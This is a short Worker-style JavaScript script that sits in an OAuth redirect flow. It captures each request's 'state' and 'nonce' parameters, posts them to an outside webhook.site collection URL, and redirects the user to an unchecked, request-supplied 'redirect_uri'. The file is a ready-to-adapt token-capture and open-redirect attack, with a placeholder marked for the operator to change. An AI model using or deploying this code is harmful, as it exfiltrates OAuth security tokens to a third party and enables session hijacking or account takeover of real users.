addEventListener("fetch", (event) => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  let url = new URL(request.url);
  let redirectUri = url.searchParams.get("redirect_uri") || "https://google.com"; // Default

  // Capture state & nonce from the first request
  let state = url.searchParams.get("state");
  let nonce = url.searchParams.get("nonce");

  // Log initial request (optional)
  await fetch("https://webhook.site/86ffa995-eef3-4d34-92c6-c90537464706", { // Change this!
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ stage: "first_redirect", state, nonce })
  });

  // Redirect user back into the OAuth flow
  return Response.redirect(redirectUri, 302);
}
